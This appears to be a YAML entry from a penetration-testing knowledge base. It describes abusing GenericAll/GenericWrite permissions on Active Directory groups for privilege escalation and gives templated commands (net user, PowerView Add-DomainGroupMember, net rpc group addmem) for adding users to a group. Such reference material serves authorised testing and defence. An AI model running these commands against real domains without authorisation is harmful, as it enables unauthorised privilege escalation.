title: GenericAll/GenericWrite Permissions Exploitation on Groups
category: 
  - AD:
    - ACL:
      - Groups  
tactic: Privilege Escalation
tags: []
description:
  - title: 
    content: Generic All/GenericWrite Permissions on groups allows to add users to the group
    references:
      - type: link
        value: https://habr.com/ru/companies/solarsecurity/articles/681108/
      - type: link
        value: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse

steps:
  - description: Add a user to the group
    options: 
      - tool: net user
        usage: net user <username> <password> /domain
      
      - tool: powerview 
        usage: Add-DomainGroupMember -Identity "<GroupName>" -Members username -Verbose
      
      - tool: net rpc (linux)
        usage: net rpc group addmem "domain.com\group name" m.lovegod -U 'domain.com\username' -S dc.domain.com
        comments: --use-kerberos=required can be added for kerberos
